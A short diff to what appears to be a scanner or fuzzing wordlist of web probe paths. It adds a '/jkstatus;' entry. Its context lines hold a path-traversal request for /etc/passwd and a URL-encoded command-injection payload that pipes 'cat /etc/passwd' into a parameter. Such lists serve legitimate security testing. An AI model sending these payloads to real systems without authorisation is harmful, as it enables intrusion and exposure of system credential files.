@@ -1,3 +1,4 @@
+/jkstatus;
 /uir//etc/passwd
 /uir//tmp/XXX/0
 /chkisg.htm%3FSip%3D1.1.1.1%20%7C%20cat%20%2Fetc%2Fpasswd
